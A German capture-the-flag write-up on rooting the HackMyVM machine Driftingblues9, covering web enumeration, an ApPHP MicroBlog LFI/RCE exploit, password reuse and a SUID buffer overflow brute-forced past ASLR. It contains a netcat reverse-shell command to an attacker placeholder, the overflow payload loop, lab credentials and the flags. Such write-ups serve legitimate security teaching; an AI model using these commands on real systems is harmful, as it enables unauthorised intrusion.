# Driftingblues9 - HackMyVM (Easy)

![Driftingblues9.png](Driftingblues9.png)

## Übersicht

*   **VM:** Driftingblues9
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Driftingblues9)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 18. April 2023
*   **Original-Writeup:** https://alientec1908.github.io/Driftingblues9_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser "Easy"-Challenge war es, Root-Zugriff auf der Maschine "Driftingblues9" zu erlangen. Die Enumeration deckte einen Webserver (Apache) auf, der eine ApPHP MicroBlog 1.0.1 Anwendung hostete. Ein bekannter Exploit (Exploit-DB 33070) für diese Anwendung ermöglichte Remote Code Execution (RCE) durch Local File Inclusion (LFI), was zu einer initialen Shell als `www-data` führte. Im Exploit-Output wurden Datenbank-Credentials (`clapton:yaraklitepe`) gefunden, die auch für den Systembenutzer `clapton` gültig waren. Nach dem Wechsel zu `clapton` wurde die User-Flag und eine Notiz gefunden, die auf einen Buffer Overflow in der lokalen, SUID-Root-Datei `/home/clapton/input` hinwies. Mittels `gdb` wurde der Offset zum Überschreiben des EIP ermittelt. Trotz aktiviertem ASLR wurde durch einen Brute-Force-Ansatz mit einer geratenen Rücksprungadresse und Shellcode eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `python2` (für Exploit-Skript ApPHP)
*   `nc` (netcat)
*   `python` / `python3` (für PTY-Shell-Stabilisierung, Payload-Generierung, http.server)
*   `find`
*   `su`
*   `wget`
*   `gdb` (GNU Debugger)
*   Metasploit Tools (`pattern_create.rb`, `pattern_offset.rb`)
*   Standard Linux-Befehle (`ip`, `vi`, `grep`, `export`, `stty`, `ls`, `cat`, `chmod`, `id`, `cd`, `echo`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Driftingblues9" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mittels `arp-scan` (Ziel: `192.168.2.131`).
    *   `nmap`-Scan identifizierte Apache (80/tcp) mit einer ApPHP MicroBlog Anwendung und RPCBind (111/tcp).
    *   `gobuster` listete Verzeichnisse und Dateien der Webanwendung auf.

2.  **Initial Access (als `www-data` via ApPHP MicroBlog RCE):**
    *   Die ApPHP MicroBlog-Version wurde als 1.0.1 identifiziert.
    *   Ein öffentlicher Exploit für ApPHP MicroBlog 1.0.1 (Exploit-DB 33070, `apPHP.py`) wurde verwendet.
    *   Das Python2-Exploit-Skript (`python2 apPHP.py http://192.168.2.131/index.php`) bestätigte eine LFI-Schwachstelle und ermöglichte RCE. Über den Exploit wurden Datenbank-Credentials (`clapton:yaraklitepe`) aus `include/base.inc.php` extrahiert.
    *   Mittels der RCE-Fähigkeit des Exploits wurde eine Netcat-Reverse-Shell zum Angreifer gestartet (`nc -e /bin/bash [Angreifer-IP] 4444`).
    *   Erfolgreicher Shell-Zugriff als `www-data`.

3.  **Privilege Escalation (von `www-data` zu `clapton`):**
    *   Als `www-data` wurde mit `su clapton` und dem zuvor gefundenen Datenbankpasswort `yaraklitepe` (das auch das Systempasswort für `clapton` war) erfolgreich zum Benutzer `clapton` gewechselt.

4.  **Privilege Escalation (von `clapton` zu `root` via Buffer Overflow):**
    *   Im Home-Verzeichnis von `clapton` wurde die User-Flag und die Datei `note.txt` gefunden. `note.txt` enthielt einen Hinweis auf einen 32-Bit Buffer Overflow in der lokalen Datei `/home/clapton/input`.
    *   Eine SUID-Suche bestätigte, dass `/home/clapton/input` SUID Root war.
    *   Die Datei `input` wurde auf die Angreifer-Maschine heruntergeladen und mit `gdb` analysiert. Eine `strcpy`-Schwachstelle wurde identifiziert.
    *   Mittels `pattern_create.rb` und `pattern_offset.rb` wurde der Offset zum Überschreiben des EIP zu 171 Bytes bestimmt.
    *   ASLR war auf dem Zielsystem aktiv (`randomize_va_space = 2`).
    *   Ein Exploit-Payload wurde konstruiert: 171 'A's, eine geratene Rücksprungadresse (`\xb0\x76\x8e\xbf`), ein NOP-Sled und x86-Shellcode.
    *   Der Exploit wurde in einer Schleife ausgeführt (`for i in {1..10000}; do (./input $(python -c 'print(...)')); done`), um ASLR durch Brute-Force zu umgehen.
    *   Nach mehreren Versuchen war der Exploit erfolgreich und lieferte eine Shell mit Root-Rechten (`euid=0(root)`). Die Root-Flag wurde gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Bekannte Webanwendungs-Schwachstelle (LFI/RCE):** Ausnutzung eines öffentlichen Exploits für ApPHP MicroBlog 1.0.1.
*   **Hartcodierte Credentials:** Datenbank-Passwörter im Klartext in `include/base.inc.php`.
*   **Passwort-Wiederverwendung:** Das Datenbankpasswort für `clapton` war identisch mit dem Systempasswort.
*   **SUID Binary Exploit (Buffer Overflow):** Eine lokale, SUID-Root-Datei (`/home/clapton/input`) war anfällig für einen klassischen Stack Buffer Overflow.
*   **ASLR Brute-Force:** Trotz aktiviertem ASLR konnte der Buffer Overflow durch wiederholte Ausführung mit einer geratenen Rücksprungadresse erfolgreich ausgenutzt werden.

## Flags

*   **User Flag (`/home/clapton/user.txt`):** `F569AA95FAFF65E7A290AB9ED031E04F`
*   **Root Flag (`/root/root.txt`):** `04D4C1BEC659F1AA15B7AE731CEEDD65`

## Tags

`HackMyVM`, `Driftingblues9`, `Easy`, `Web`, `Apache`, `ApPHP MicroBlog`, `LFI`, `RCE`, `Exploit-DB`, `Credentials Disclosure`, `Password Reuse`, `SUID Binary`, `Buffer Overflow`, `gdb`, `ASLR Brute-Force`, `Privilege Escalation`, `Linux`
